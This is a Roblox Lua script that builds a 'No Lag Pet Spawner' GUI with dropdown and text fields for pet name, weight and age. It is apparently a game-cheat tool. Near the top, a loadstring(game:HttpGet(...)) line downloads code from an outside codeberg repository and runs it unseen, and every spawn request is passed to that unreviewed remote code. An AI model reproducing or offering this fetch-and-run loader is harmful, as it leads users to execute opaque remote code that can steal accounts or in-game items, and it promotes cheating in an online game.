-- LocalScript in StarterGui
local Players      = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player       = Players.LocalPlayer

-- load spawner (don’t call Spawner.Load())
local Spawner = loadstring(game:HttpGet("https://codeberg.org/DarkBackup/script/raw/branch/main/loadstring"))()

-- ScreenGui
local gui = Instance.new("ScreenGui")
gui.Name   = "DupeSpawnerUI"
gui.Parent = player:WaitForChild("PlayerGui")

-- Main window
local window = Instance.new("Frame", gui)
window.Name             = "Window"
window.Size             = UDim2.new(0,360,0,0)    -- start collapsed
window.Position         = UDim2.new(0.5,-180,0.5,-150)
window.BackgroundColor3 = Color3.fromRGB(25,25,25)
window.BorderSizePixel  = 0
window.ClipsDescendants = false                   -- allow dropdown to show
Instance.new("UICorner", window).CornerRadius = UDim.new(0,8)

local FULL_SIZE      = UDim2.new(0,360,0,300)
local MIN_SIZE       = UDim2.new(0,360,0,36)
local isMinimized    = false

-- Title bar
local titleBar = Instance.new("Frame", window)
titleBar.Name               = "TitleBar"
titleBar.Size               = UDim2.new(1,0,0,36)
titleBar.Position           = UDim2.new(0,0,0,0)
titleBar.BackgroundColor3   = Color3.fromRGB(35,35,35)
Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0,8)
titleBar.ZIndex = 2

local title = Instance.new("TextLabel", titleBar)
title.Name                   = "Title"
title.Text                   = "No Lag Pet Spawner V1.3"
title.Font                   = Enum.Font.SourceSansBold
title.TextSize               = 18
title.TextColor3             = Color3.new(1,1,1)
title.BackgroundTransparency = 1
title.AnchorPoint            = Vector2.new(0.5,0.5)
title.Position               = UDim2.new(0.5,0,0.5,0)
title.Size                   = UDim2.new(1,-80,1,0)
title.TextXAlignment         = Enum.TextXAlignment.Center
title.TextYAlignment         = Enum.TextYAlignment.Center
title.ZIndex                 = 2

local minBtn = Instance.new("TextButton", titleBar)
minBtn.Name                   = "Minimize"
minBtn.Text                   = "—"
minBtn.Font                   = Enum.Font.SourceSansBold
minBtn.TextSize               = 20
minBtn.TextColor3             = Color3.new(1,1,1)
minBtn.BackgroundTransparency = 1
minBtn.Size                   = UDim2.new(0,36,0,36)
minBtn.Position               = UDim2.new(1,-40,0,0)
minBtn.ZIndex                 = 2

-- Dragging
do
    local dragging, dragStart, startPos
    titleBar.InputBegan:Connect(function(i)
        if i.UserInputType==Enum.UserInputType.MouseButton1 then
            dragging=true
            dragStart=i.Position
            startPos=window.Position
            i.Changed:Connect(function()
                if i.UserInputState==Enum.UserInputState.End then dragging=false end
            end)
        end
    end)
    titleBar.InputChanged:Connect(function(i)
        if dragging and i.UserInputType==Enum.UserInputType.MouseMovement then
            local delta=i.Position - dragStart
            window.Position=UDim2.new(
                startPos.X.Scale, startPos.X.Offset+delta.X,
                startPos.Y.Scale, startPos.Y.Offset+delta.Y
            )
        end
    end)
end

-- Main content
local main = Instance.new("Frame", window)
main.Name     = "MainContent"
main.Size     = UDim2.new(1,0,1,-36)
main.Position = UDim2.new(0,0,0,36)
main.BackgroundTransparency = 1
main.ZIndex   = 1

local layout = Instance.new("UIListLayout", main)
layout.Padding             = UDim.new(0,10)
layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
layout.SortOrder           = Enum.SortOrder.LayoutOrder

-- Tab label
local tabBtn = Instance.new("TextButton", main)
tabBtn.Text             = "Pet Spawner"
tabBtn.Font             = Enum.Font.SourceSans
tabBtn.TextSize         = 16
tabBtn.TextColor3       = Color3.new(1,1,1)
tabBtn.BackgroundColor3 = Color3.fromRGB(35,35,35)
tabBtn.BorderSizePixel  = 0
tabBtn.Size             = UDim2.new(0.9,0,0,32)
Instance.new("UICorner", tabBtn).CornerRadius = UDim.new(0,6)

-- Dropdown helper
local function makeDropdown(labelText, items)
    local container = Instance.new("Frame", main)
    container.Size = UDim2.new(0.9,0,0,36)
    container.BackgroundTransparency = 1

    local lbl = Instance.new("TextLabel", container)
    lbl.Text = labelText
    lbl.Font = Enum.Font.SourceSans
    lbl.TextSize = 14
    lbl.TextColor3 = Color3.new(1,1,1)
    lbl.BackgroundTransparency = 1
    lbl.Size = UDim2.new(0.4,0,1,0)

    local btn = Instance.new("TextButton", container)
    btn.Text = items[1]
    btn.Font = Enum.Font.SourceSans
    btn.TextSize = 14
    btn.TextColor3 = Color3.new(1,1,1)
    btn.BackgroundColor3 = Color3.fromRGB(45,45,45)
    btn.BorderSizePixel = 0
    btn.Size = UDim2.new(0.55,0,1,0)
    btn.Position = UDim2.new(0.45,0,0,0)
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,4)

    -- options frame parented to gui so it's above everything
    local opts = Instance.new("Frame", gui)
    opts.Visible          = false
    opts.BackgroundColor3 = Color3.fromRGB(45,45,45)
    opts.BorderSizePixel  = 0
    opts.Size             = UDim2.new(0, btn.AbsoluteSize.X, 0, #items*36)
    Instance.new("UICorner", opts).CornerRadius = UDim.new(0,4)
    opts.ZIndex = 100

    -- reposition function
    local function updatePos()
        local absPos = btn.AbsolutePosition
        opts.Position = UDim2.new(0, absPos.X, 0, absPos.Y + btn.AbsoluteSize.Y + 2)
        opts.Size     = UDim2.new(0, btn.AbsoluteSize.X, 0, #items*36)
    end

    local list = Instance.new("UIListLayout", opts)
    list.SortOrder = Enum.SortOrder.LayoutOrder
    list.Padding   = UDim.new(0,2)

    for i,v in ipairs(items) do
        local e = Instance.new("TextButton", opts)
        e.Text             = v
        e.Font             = Enum.Font.SourceSans
        e.TextSize         = 14
        e.TextColor3       = Color3.new(1,1,1)
        e.BackgroundColor3 = Color3.fromRGB(55,55,55)
        e.BorderSizePixel  = 0
        e.Size             = UDim2.new(1,0,0,36)
        e.LayoutOrder      = i
        Instance.new("UICorner", e).CornerRadius = UDim.new(0,4)
        e.ZIndex = 100
        e.MouseButton1Click:Connect(function()
            btn.Text     = v
            opts.Visible = false
        end)
    end

    btn.MouseButton1Click:Connect(function()
        updatePos()
        opts.Visible = not opts.Visible
    end)

    return btn
end

-- TextBox helper
local function makeBox(labelText, placeholder)
    local container = Instance.new("Frame", main)
    container.Size = UDim2.new(0.9,0,0,36)
    container.BackgroundTransparency = 1

    local lbl = Instance.new("TextLabel", container)
    lbl.Text = labelText
    lbl.Font = Enum.Font.SourceSans
    lbl.TextSize = 14
    lbl.TextColor3 = Color3.new(1,1,1)
    lbl.BackgroundTransparency = 1
    lbl.Size = UDim2.new(0.4,0,1,0)

    local box = Instance.new("TextBox", container)
    box.PlaceholderText  = placeholder
    box.Text             = ""
    box.Font             = Enum.Font.SourceSans
    box.TextSize         = 14
    box.TextColor3       = Color3.new(1,1,1)
    box.BackgroundColor3 = Color3.fromRGB(45,45,45)
    box.BorderSizePixel  = 0
    box.Size             = UDim2.new(0.55,0,1,0)
    box.Position         = UDim2.new(0.45,0,0,0)
    Instance.new("UICorner", box).CornerRadius = UDim.new(0,4)

    return box
end

-- Build fields
local nameDrop = makeDropdown("Pet Name:", {"Mimic Octopus","Raccoon","Disco Bee","Butterfly","Dragonfly","Queen Bee"})
local kgBox     = makeBox("Weight (KG):", "e.g. 1")
local ageBox    = makeBox("Age:",          "e.g. 2")

-- Spawn button
local spawnBtn = Instance.new("TextButton", main)
spawnBtn.Text             = "Spawn"
spawnBtn.Font             = Enum.Font.SourceSansBold
spawnBtn.TextSize         = 18
spawnBtn.TextColor3       = Color3.new(1,1,1)
spawnBtn.BackgroundColor3 = Color3.fromRGB(60,60,60)
spawnBtn.BorderSizePixel  = 0
spawnBtn.Size             = UDim2.new(0.5,0,0,36)
spawnBtn.Position         = UDim2.new(0.25,0,0,0)
Instance.new("UICorner", spawnBtn).CornerRadius = UDim.new(0,6)
spawnBtn.ZIndex           = 1

spawnBtn.MouseButton1Click:Connect(function()
    local pet = nameDrop.Text
    local kg  = tonumber(kgBox.Text)  or 1
    local age = tonumber(ageBox.Text) or 1
    if pet ~= "" then
        Spawner.SpawnPet(pet, kg, age)
    end
end)

-- Fade-in
TweenService:Create(window, TweenInfo.new(0.4), {Size = FULL_SIZE}):Play()

-- Minimize
minBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    if isMinimized then
        window:TweenSize(MIN_SIZE, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
        main.Visible = false
    else
        main.Visible = true
        window:TweenSize(FULL_SIZE, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
    end
end)
